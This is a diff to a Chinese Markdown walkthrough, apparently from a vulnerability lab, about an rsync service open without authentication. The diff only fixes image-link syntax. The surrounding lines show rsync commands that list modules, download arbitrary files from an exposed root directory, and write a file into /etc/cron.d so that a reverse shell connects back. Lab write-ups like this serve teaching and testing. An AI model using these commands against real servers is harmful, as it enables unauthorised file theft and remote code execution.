@@ -19,7 +19,7 @@ rsync rsync://your-ip:873/
 
 可以查看模块名列表：
 
-[](1.png)
+![](1.png)
 
 如上图，有一个src模块，我们再列出这个模块下的文件：
 
@@ -27,7 +27,7 @@ rsync rsync://your-ip:873/
 rsync rsync://your-ip:873/src/
 ```
 
-[](2.png)
+![](2.png)
 
 这是一个Linux根目录，我们可以下载任意文件：
 
@@ -43,4 +43,4 @@ rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
 
 我们写入了一个cron任务，成功反弹shell：
 
-[](3.png)
+![](3.png)
